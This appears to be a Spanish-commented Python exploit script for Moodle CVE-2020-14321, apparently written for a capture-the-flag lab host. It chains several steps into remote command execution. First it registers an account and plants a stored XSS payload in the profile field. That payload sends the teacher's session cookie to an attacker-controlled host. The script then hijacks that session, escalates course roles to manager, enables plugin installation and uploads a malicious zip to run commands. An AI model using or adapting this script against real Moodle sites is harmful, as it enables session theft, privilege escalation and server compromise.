...
# Clases -------------------------------------.
class Color:  # pa darle color a la vida
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
...
# Funciones ----------------------------------.
def def_handler(sig, frame):  # controlamos la salida forzada con CTRL+C
    print(Color.RED + "\n[!] Interrución recibida, saliendo...\n" + Color.END)
    exit(1)

signal.signal(signal.SIGINT, def_handler)

def arguments():  # recibimos los argumentos del programa
    parse = argparse.ArgumentParser(description='• Remote Command Execution - CVE-2020-14321')
    parse.add_argument(dest='lhost', type=str, help='Dirección IP donde esta servido el puerto 8000')
    parse.add_argument(dest='teacher_cookie', type=str, help='Cookie del profesor')
    parse.add_argument('-url', dest='url_moodle', default='http://moodle.schooled.htb/moodle', type=str, help='URL del sitio (default: http://moodle.schooled.htb/moodle)')
    parse.add_argument('-u', dest='username', type=str, default='lanz', help='Nombre de usuario (default: lanz)')
    parse.add_argument('-p', dest='password', type=str, default='Lanz123$!', help='Contraseña del usuario (default: Lanz123$!)')
    random_email = ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + "@student.schooled.htb" 
    parse.add_argument('-e', dest='email', type=str, default=random_email, help='Email del usuario (default: <random>@student.schooled.htb)')
    parse.add_argument('-c', dest='command', type=str, default="id", help='Comando a ejecutar en el sistema (default: id)')
    parse.add_argument('-id', dest='id_manager', type=str, default='25', help='ID del usuario manager (default: 25 (Lianne Carter))')
    return parse.parse_args()

def register(url, username, password, email):  # registramos la cuenta y extraemos sesión
    p1 = log.progress("Creando cuenta " + Color.PURPLE + username + " : " + password + Color.END + " en el sitio")
    ...
    r = session.post(url + '/login/signup.php', data=data_post)

    if "This username already exists, choose another" in r.text:
        p1.status("Esta cuenta ya existe, intentando iniciar sesión...")
        session, id_user, sess_key = login(url, username, password, p1)
    else:
        try:
            confirm_token = re.findall(r'type="hidden" name="data" value="(.*?)"', r.text)[0]
            r = session.get(url + '/login/confirm.php?data=' + confirm_token)

            if "Your registration has been confirmed" not in r.text:
                p1.failure(Color.RED + "✘" + Color.END)
                print(Color.RED + "\nValida tamaño de la contraseña (8+) y que tenga mayuscula, digitos y simbolos. O que el email este en el dominio correcto\n" + Color.END)
                exit(1)

            id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
            sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

            p1.success(Color.YELLOW + "✓" + Color.END)
            time.sleep(0.3)
        except IndexError:
            p1.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nValida tamaño de la contraseña (8+) y que tenga mayuscula, digitos y simbolos. O que el email este en el dominio correcto\n" + Color.END)
...
def login(url, username, password, p1):  # iniciamos sesión en el sitio
    session = requests.Session()
    ...
    if "Recently accessed courses" not in r.text:
        p1.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nProbablemente exista pero no con esas credenciales, crea una nueva\n" + Color.END)
        exit(1)
...
def moodle_net_CSRF(session, url, id_user, sess_key, username, email, lhost):  # modificamos campo al que apunta el profesor, así le robamos su cookie de sesión
    '''
    3. Nos enrolamos en el curso "Maths" para posteriormetne modificar nuestro perfil e interceptar la cookie del profesor.
    '''

    p2 = log.progress("Enrolandonos en el curso y modificando campo " + Color.PURPLE + "Moodle Net" + Color.END)
    time.sleep(1)

    r = session.get(url + '/user/profile.php', params={"id":id_user})
    if "<script>document.write('<img src=\"http://" + lhost in r.text:
        p2.status("El campo esta modificado de antes, sigamos...")
        time.sleep(2)
        p2.success(Color.YELLOW + "✓" + Color.END)
        time.sleep(0.3)
    else:
        data_post = {
            "id" : "5",
        ...
        r = session.post(url + '/enrol/index.php', data=data_post)

        if "Calculus" not in r.text:
            p2.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nError en la enrolación :P\n" + Color.END)
            exit(1)
        ...
        data_post = {
            ...
            "email" : email,
            "maildisplay" : "2",
            "moodlenetprofile" : "<script>document.write('<img src=\"http://%s:8000/kheloke?cookie=' + document.cookie + '\">')</script>" % (lhost),
            "city" : "",
            "country" : "",
            "timezone" : "99",
            "imagefile" : "997707204",
        ...
        r = session.post(url + '/user/edit.php', data=data_post)

        if "<script>document.write(" not in r.text:
            p2.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nError modificando el campo Moodle Net\n" + Color.END)
            exit(1)
...
def enrol2rce(session, url, id_manager, username, teacher_cookie, command):  # obtenemos permisos administrativos
    '''
    4. Asignamos rol de manager al profesor y al usuario manager real. Esto para poder modificar el curso con permisos administrativos.
    '''

    p4 = log.progress("Convirtiendonos en el profesor " + Color.PURPLE + "Manuel Phillips" + Color.END)

    session.cookies.set('MoodleSession', teacher_cookie, domain='moodle.schooled.htb', path='/moodle/')

    r = session.get(url + '/user/index.php?id=5')
    time.sleep(0.3)
    ...
    try:
        ...
        print(Color.RED + "\nValida cookie (quizas ya expiro) y reintenta\n" + Color.END)
        exit(1)
    ...
    # Actualizamos roles
    p5 = log.progress("Modificando roles para movernos a la cuenta " + Color.PURPLE + "manager" + Color.END)

    id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

    session = update_rol(session, url, sess_key, id_user)
    session = update_rol(session, url, sess_key, id_manager)
    ...
    if "You are logged in as Lianne Carter" not in r.text:
        p5.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError al migrarnos a la cuenta manager, cookie expirada\n" + Color.END)
        exit(1)

    p5.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)

    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

    # Modificamos el rol manager en si para poder instalar plugins
    session, sess_key = update_rol_manager(session, url, sess_key)

    # Subimos zip malicioso
    zipb64_up(session, url, sess_key)

    # Ejecutamos comandos.
    moodle_RCE(url, command)

def update_rol(session, url, sess_key, id_user):
    '''
    5. Actualizamos los roles del profesor, para que el pueda asignar a la cuenta manager como <manager> del curso.
    '''
...
def update_rol_manager(session, url, sess_key):
    '''
    6. Actualizamos el rol manager como tal, ya que debemos habilitar la instalacion de plugins
        * Payload extraido de: https://github.com/HoangKien1020/CVE-2020-14321
        * Enviar multiples valores a la misma variable: https://stackoverflow.com/questions/23384230/how-to-post-multiple-value-with-same-key-in-python-requests
    '''

    p6 = log.progress("Modificando rol manager para instalar plugins")
    ...
    # Arriba modificamos el campo description, si en la web encuentra el texto que le pusimos, quiere decir que edito.
    if random_desc not in r.text:
        p6.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nProblemas al modificar los campos\n" + Color.END)
        exit(1)
    else:
        r = session.get(url + '/admin/search.php')
        if "Install plugins" not in r.text:
            p6.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nCampos modificados pero no se han habilitado las opciones para instalar plugins." + Color.END)
            print(Color.RED + "\n- (Extrañamente a veces los habilita y otras no, reintenta!!)" + Color.END)
            exit(1)
...
def zipb64_up(session, url, sess_key):  # subimos el objeto .zip al sitio
    '''
    7. Hacemos el carge del archivo zip y todos los demas campos necesarios.
        * https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/
    '''

    p7 = log.progress("Subiendo archivo " + Color.PURPLE + ".zip" + Color.END + " malicioso")
    ...
    if "rce.zip" not in r.text:
        ...
        print(Color.RED + "\nArchivo no subido, valida que el contenido en base64 genere un zip en tu sistema.\n" + Color.END)
        exit(1)

    # Hacemos la peticion para cargar el archivo
    data_post = {
        "sesskey" : sess_key,
    ...
    if "Validation successful, installation can continue" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nArchivo no subido, problemas instalando el plugin.\n" + Color.END)
        exit(1)

    # Confirmamos la subida
    ...
    if "Current release information" not in r.text:
        p7.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nArchivo no subido, problemas en la confirmación.\n" + Color.END)
        exit(1)
...
def moodle_RCE(url, command):
    '''
    8. Ejecucion remota de comandos mediante los archivos del objeto .zip
    '''
    
    p8 = log.progress("Ejecutando " + Color.PURPLE + command + Color.END)
    time.sleep(1)
    ...
    print("[" + Color.YELLOW + "+" + Color.END + "]" + Color.GREEN + " A seguir rompiendo todo!!\n" + Color.END)

# Inicio del programa ------------------------.
if __name__ == '__main__':
    args = arguments()

    banner = base64.b64decode("").decode()

    print(Color.BLUE + banner + Color.END)

    session, id_user, sess_key = register(args.url_moodle, args.username, args.password, args.email)
    session, sess_key = moodle_net_CSRF(session, args.url_moodle, id_user, sess_key, args.username, args.email, args.lhost)
    enrol2rce(session, args.url_moodle, args.id_manager, args.username, args.teacher_cookie, args.command)
